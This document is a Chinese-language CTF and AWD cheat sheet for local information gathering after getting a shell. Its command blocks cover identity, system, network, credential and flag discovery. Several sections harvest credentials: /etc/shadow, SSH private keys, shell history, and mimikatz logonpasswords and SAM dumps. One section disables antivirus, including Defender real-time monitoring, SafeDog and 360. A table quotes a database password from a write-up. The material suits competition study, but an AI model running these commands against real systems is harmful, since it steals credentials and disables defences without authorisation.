# 本机信息收集

## 总览

> **用途**: 拿到 shell 后，在**本机**做信息收集 —— 为提权、横向移动、找 flag 提供情报。\
> **来源**: 本地赛事资料整理。
> **定位**: getshell → **本文（信息收集）** → [提权方法总结.md](提权方法总结.md) → [横向移动方法总结.md](横向移动方法总结.md)\
> **关联**: [Web 漏洞 Getshell 总索引](web漏洞getshell/README.md)

***

## 零、收集什么（7 个方向）

| 方向 | 回答什么问题 | 服务于 |
| --- | --- | --- |
| **① 身份权限** | 我是谁？什么权限？ | 决定能否直接读 flag |
| **② 系统环境** | 什么系统？什么版本？有无已知漏洞？ | 提权 |
| **③ 网络位置** | 我在哪？能摸到谁？ | 横向移动 |
| **④ 凭据搜集** | 有哪些密码/hash/密钥？ | 横向移动 |
| **⑤ 敏感文件** | flag 在哪？源码/配置在哪？ | 找 flag |
| **⑥ 进程服务** | 跑着什么？有什么可打的？ | 提权 / 横向 |
| **⑦ 防御状况** | 有杀软吗？有监控吗？ | 规避 |

**原则**：先做**无副作用**的读取（`whoami`），再做可能触发告警的动作（扫内网、下载工具）。

## 一、① 身份权限

### Linux

```bash
whoami; id                          # 当前用户 + 组 + uid/gid
id -a                               # 详细
sudo -l                             # sudo 权限（提权第一线索）
cat /etc/passwd                     # 系统用户
cat /etc/group                      # 系统组
w; who; last | head                 # 在线用户 / 登录历史
```

### Windows

```powershell
whoami                              # 当前用户
whoami /priv                        # ★ 特权（SeImpersonate → Potato 提权）
whoami /groups                      # 组
whoami /all                         # 全部（含 SID + 特权 + 组）
net user                            # 本机用户
net localgroup administrators       # 管理员组
net user <username>                 # 用户详情
query user                          # 在线用户
```

> **重点**：`whoami /priv` 里出现 `SeImpersonatePrivilege` → 直接上 [SweetPotato / JuicyPotato](提权方法总结.md)。

## 二、② 系统环境

### Linux

```bash
uname -a                            # ★ 内核版本 → 查内核提权 EXP
cat /etc/os-release                 # 发行版 + 版本
cat /proc/version                   # 内核编译信息
cat /etc/issue; cat /etc/*-release
hostname; hostnamectl
lscpu; free -h; df -h               # CPU / 内存 / 磁盘
env                                 # ★ 环境变量（可能含密码/密钥）
cat /etc/crontab; ls -la /etc/cron.*; crontab -l   # ★ 计划任务（提权点）
```

### Windows

```powershell
systeminfo                          # ★ 补丁版本 → 查 CVE（MS17-010 等）
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
wmic qfe list brief                 # ★ 已装补丁（缺失的即可能可利用）
wmic os get caption,version,osarchitecture
set                                 # ★ 环境变量
```

**WP 案例**：`2022QWB_final_RDP` — `xrdp-sesman 0.9.18` 版本识别出 `CVE-2022-23613`。

## 三、③ 网络位置（横向前置）

### Linux

```bash
ip a; ip route                      # ★ 网卡 + 路由
ifconfig -a
netstat -antp                       # ★ 连接 + 监听端口 + 进程
ss -antp                            # 现代替代
arp -a                              # ★ ARP 表（发现同网段主机）
cat /etc/hosts                      # 主机名映射
cat /etc/resolv.conf                # DNS
iptables -L -n                      # 防火墙规则
```

### Windows

```powershell
ipconfig /all                       # ★ 网卡 + DNS
route print                         # 路由表
netstat -ano                        # ★ 连接 + PID
arp -a                              # ★ ARP 表
net view                            # 域内机器列表
net share                           # 共享
nltest /dclist:domain.local         # 域控列表
```

> **ARP 表 + 路由表**是判断"我在哪个网段、能横向到谁"的关键。\
> **WP 案例**：春秋云境 Powergrid 用 `fping 172.16.200.0/24` 扫出 4 台目标机。

## 四、④ 凭据搜集 ★（横向的核心）

### 4.1 配置文件中的密码

```bash
# Linux
grep -riE "password|passwd|pwd|secret|key" /var/www/ 2>/dev/null
find / -name "config.php" -o -name "*.yml" -o -name "*.ini" -o -name ".env" 2>/dev/null
cat /var/www/html/config.php
cat /opt/**/config.txt
cat ~/.bash_history                 # ★ 历史命令常含明文密码
cat /etc/shadow                     # 需 root
```

### 4.2 WP 实证（配置泄露是横向第一步）

| 找到的文件 | 内容 | 出处 |
| --- | --- | --- |
| `application.yml` | MySQL 密码 `rjS8K2RW7KE4E1vk` | 春秋云境 Powergrid |
| `/opt/jumpserver/config/config.txt` | `BOOTSTRAP_TOKEN` | 上海磐石行动 |
| `zabbix.userdirectory_ldapG` | LDAP 凭据 dump | 云境 GreatWall2025 |
| `config_global.php` | Discuz 数据库密码 | AWD 攻略 |
| `wp-config.php` | WordPress 数据库密码 | AWD 攻略 |
| `data/common.inc.php` | DEDECMS 数据库密码 | AWD 攻略 |

### 4.3 SSH 密钥

```bash
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa                   # 私钥 → 直接 ssh -i
ls -la ~/.ssh/
cat ~/.ssh/known_hosts              # 曾连过哪些主机
```

### 4.4 浏览器 / 应用凭据

```bash
# Linux
ls ~/.mozilla ~/.config/google-chrome
# Windows
dir "%APPDATA%\Mozilla\Firefox\Profiles"
dir "%LOCALAPPDATA%\Google\Chrome\User Data"
```

工具：`LaZagne`（一键扒各种应用密码）

### 4.5 Windows 内存凭据

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords   # ★ 内存中的明文/hash
mimikatz # lsadump::sam               # 本地用户 hash
mimikatz # lsadump::cache             # 域缓存凭据
mimikatz # vault::list                # 凭据管理器
```

### 4.6 环境变量 / 历史

```bash
env                                  # 可能有 AWS_KEY / TOKEN
cat ~/.bash_history                  # ★ 命令行里的密码
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
```

**WP 案例**：招商铸盾 2025 — flag 藏在**环境变量**里。

## 五、⑤ 敏感文件（找 flag）

### 5.1 找 flag

```bash
find / -name "flag*" 2>/dev/null
find / -iname "*flag*" -type f 2>/dev/null
grep -r "flag{" / 2>/dev/null
grep -rE "flag\{|CTF\{|ctf\{" /var/www /home /root 2>/dev/null
locate flag 2>/dev/null
```

### 5.2 找源码 / 备份

```bash
find / -name "*.sql" -o -name "*.bak" -o -name "*.zip" -o -name "*.tar.gz" 2>/dev/null
find /var/www -name "*.php" | head -50
ls -la /var/backups /tmp
```

### 5.3 找近期修改（AWD / 应急响应）

```bash
find /var/www/html -name "*.php" -mmin -20      # 20 分钟内改动 → 可疑 webshell
find / -newer /tmp/timecheck -type f 2>/dev/null
find / -name "*.php" | xargs grep -l "eval(\|assert(\|system("   # ★ 杀 webshell
```

## 六、⑥ 进程与服务

### Linux

```bash
ps aux                              # ★ 进程（看 root 跑什么）
ps aux | grep -v "^\[" 
ps -ef --forest                     # 进程树
top -b -n1 | head -20
systemctl list-units --type=service --state=running    # 服务
service --status-all
ls -la /proc/*/cwd 2>/dev/null      # 进程工作目录
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '
```

### Windows

```powershell
tasklist                            # 进程
tasklist /svc                       # 进程 + 服务
wmic process get name,processid,commandline   # ★ 命令行
sc query state= all                 # 服务
wmic service get name,pathname,startmode | findstr /i "Auto"  # ★ 服务路径
net start
```

**提权关注点**：

* `root` / `SYSTEM` 权限运行的**自定义程序**
* 服务路径**未加引号且含空格** → Unquoted Service Path
* 服务的**可写目录**

## 七、⑦ 防御状况（规避）

### Linux

```bash
ps aux | grep -iE "safedog|yunsuo|anquan|hids|ossec|wazuh|falcon|falconctl"
ls /usr/local/ | grep -iE "safe|yun"
ps aux | grep -iE "auditd|rsyslog"
```

### Windows

```powershell
tasklist | findstr /i "defender msmpeng safedog 360 huorong qqpc"
sc query WinDefend                  # Defender 状态
Get-MpComputerStatus                # ★ Defender 详细状态
```

**关杀软**（WP 实证）：

```powershell
net stop SafeDogGuardCenter                                    # 安全狗
powershell Set-MpPreference -DisableRealtimeMonitoring $true   # Defender
taskkill /f /im 360tray.exe
```

出处：春秋云境 Powergrid

## 九、命令速查（getshell 后第一分钟）

```bash
# === 身份 ===
whoami; id                          # Linux
whoami /priv; whoami /all           # Windows

# === 系统 ===
uname -a; cat /etc/os-release       # Linux
systeminfo; wmic qfe list brief     # Windows

# === 网络 ===
ip a; netstat -antp; arp -a         # Linux
ipconfig /all; netstat -ano; arp -a # Windows

# === 凭据 ===
sudo -l
cat ~/.bash_history
grep -ri "password" /var/www/ 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# === flag ===
find / -name "flag*" 2>/dev/null
grep -r "flag{" / 2>/dev/null

# === 提权线索 ===
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -002 -type d 2>/dev/null     # 可写目录
cat /etc/crontab; crontab -l              # 计划任务
```
